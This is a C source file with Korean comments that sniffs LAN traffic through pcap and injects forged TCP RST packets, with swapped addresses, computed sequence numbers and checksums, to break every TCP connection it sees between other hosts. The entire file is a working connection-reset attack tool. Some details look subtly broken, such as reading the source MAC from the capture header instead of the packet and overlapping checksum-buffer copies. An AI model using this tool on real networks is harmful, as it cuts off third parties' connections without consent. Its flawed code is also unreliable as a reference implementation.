pcap_t *adhandle;	//device handle
u_int localaddr;	//local ip address
struct sockaddr_in *lSock;	//Local socket structure

//typedef struct sockaddr_in {
//
//#if(_WIN32_WINNT < 0x0600)
//	short   sin_family;
//#else //(_WIN32_WINNT < 0x0600)
//	ADDRESS_FAMILY sin_family;
//#endif //(_WIN32_WINNT < 0x0600)
//
//	USHORT sin_port;
//	IN_ADDR sin_addr;
//	CHAR sin_zero[8];
//} SOCKADDR_IN, *PSOCKADDR_IN;
////struct pcap_pkthdr {
//	struct timeval ts;	/* time stamp */
//	bpf_u_int32 caplen;	/* length of portion present */
//	bpf_u_int32 len;	/* length this packet (off wire) */
//};.



u_int iptoUINT(IP_address *ip) //문자열값을 int값으로 변경하는 함수
{
	u_int ipaddr;
	ipaddr = ip->byte4 | ip->byte3 << 8;
	ipaddr = ipaddr |ip->byte2 << 16;
	ipaddr = ipaddr |ip->byte1 << 24;

	return ipaddr;//해당 ip의 int값 반환
}
//CRC 함수
u_short csum(u_short *buf, u_int size)
{
	u_long sum = 0;
	for (int i = 0; i < size; i++)
		sum += *buf++;
	sum = (sum >> 16) + (sum & 0xffff);
		// 자리올림값 + 자리올림을 제외한 나머지 2바이트값 
	sum += sum >> 16;		//한번더 자리올림이 있을수 있으니 

	return (u_short)~sum; //1의보수값 반환

}

//패킷 내용 변경 함수
void send_reset(mac_address *srcmac,
	IP_address *srcip, u_short sport,
	mac_address *dstmac, IP_address *dstip,
	u_short dport, u_int seqnum, u_int Winsize)
{
	u_short tcp_hdrcrc[16];	//tcp 헤더 체크섬을 위한 변수
	u_short ip_hdrcrc[10];	//ip 헤더 체크섬을 위한 변수

	u_short tcp_tos = htons(0x06);	//ip헤더의(L3) 상위프로토콜 값(tcp) 0x6
	u_short tcp_hlen = htons(0x14);	//tcp 헤더길이(20 byte)
	u_short ip_tos = htons(0x0800);	//이더넷(L2)헤더의 상위프로토콜 값 ip(0x0800) , ARP(0x0806),ICMP(0x0835)
	

	ip_header iph;
	tcp_header tcph;

	u_char pkt[54];

	printf("Attempting to Reset : %d.%d.%d.%d:%d -> %d.%d.%d.%d:%d \n"
		, srcip->byte1, srcip->byte2, srcip->byte3, srcip->byte4, ntohs(sport),
		dstip->byte1, dstip->byte2, dstip->byte3, dstip->byte4, ntohs(dport));

	iph.ip_version = 0x45 & 0xF0;
	iph.ip_leng = 0x45 & 0x0F;
	iph.tos = 0x01;
	iph.identification = htons(0x0800);
	iph.Fragment_offset = 0x0;
	iph.ttl = 0xff;
	iph.upper_protocol = 0x06;
	iph.header_checksum = 0x00;		//원래 체크섬값 계산시 체크섬필드는 안들어가지만 해당값을 0으로세팅하면 
									//그값을 더해도 checksum 필드값은 더하지 않는것이랑  같은 결과가 나온다 =>Good idea! 발상의 전환
	iph.src = *dstip;	//시작 주소와 도착 주소를 바꾼다
	iph.dst = *srcip;

	memset(ip_hdrcrc, 0, sizeof(ip_hdrcrc));
	memcpy(ip_hdrcrc, &iph, 20);

	iph.header_checksum = csum(ip_hdrcrc, 10);	//ip 헤더 체크섬 값 



	tcph.SrcPort = dport;	//시작 포트와 도착 포트 변경한다
	tcph.DstPort = sport;
	tcph.Seq_Num = htonl(ntohl(seqnum) + ntohs(Winsize) - 2);
	tcph.Ack_Num = tcph.Seq_Num + htonl(0x1);
	tcph.tcp_h_Len = 0x50;
	tcph.Flags = RST;	//RST플래그로 설정한다
	tcph.WinSize = Winsize;
	tcph.UrgPtr = 0x00;
	tcph.CRC = 0x00;		//원래 체크섬값 계산시 체크섬필드는 안들어가지만 해당값을 0으로세팅하면 
							//그값을 더해도 checksum 필드값은 더하지 않는것이랑  같은 결과가 나온다 =>Good idea! 발상의 전환

	memset(tcp_hdrcrc, 0, 32);
	memcpy(tcp_hdrcrc, &tcph, 20);
	memcpy(&tcp_hdrcrc[10], &iph.src, 4);
	memcpy(&tcp_hdrcrc[12], &iph.dst, 4);
	memcpy(&tcp_hdrcrc[14], &tcp_tos, 2);
	memcpy(&tcp_hdrcrc[15], &tcp_hlen, 2);

	tcph.CRC = csum(tcp_hdrcrc, 16);			//tcp 헤더 체크섬 값

	//패킷에 데이터담기
	memcpy(pkt, srcmac, 6);	//시작 맥주소
	memcpy(pkt + 6, dstmac, 6);	// 목적지 맥주소
	memcpy(pkt + 12, &ip_tos, 2);	//상위 프로토콜
	memcpy(pkt + 14, &iph, 20);	//ip 헤더
	memcpy(pkt + 14 + sizeof(ip_header), &tcph, 20);	//tcp 헤더

	//패킷전송
	if (pcap_sendpacket(adhandle, pkt, sizeof(pkt)) != 0)
		fprintf(stderr, "Error sending the packet : \n", pcap_geterr(adhandle));
}
	
/* Callback function invoked by libpcap for every incoming packet */
void packet_handler(u_char *param, const struct pcap_pkthdr *pkt_header, const u_char *pkt_data)
{
	u_int ip_len;
	mac_address *srcmac;
	mac_address *dstmac;
	ip_header *iph;
	tcp_header *tcph;
	dstmac = (mac_address*)pkt_data;
	srcmac = (mac_address*)(pkt_header + 6);
	iph = (ip_header*)(pkt_data + 14);

	//if upper protocol will be tcp
	if (iph->upper_protocol == TCP)
	{	
		if (localaddr != iptoUINT(&iph->src) && localaddr != iptoUINT(&iph->dst)){
			ip_len = iph->ip_leng * 4;
			tcph = (tcp_header*)(pkt_data + 14 + ip_len);
			if (tcph->Flags != RST)
				send_reset(srcmac, &iph->src, tcph->SrcPort, dstmac, &iph->dst, tcph->DstPort, tcph->Ack_Num, tcph->WinSize);
		}
	}
	
}
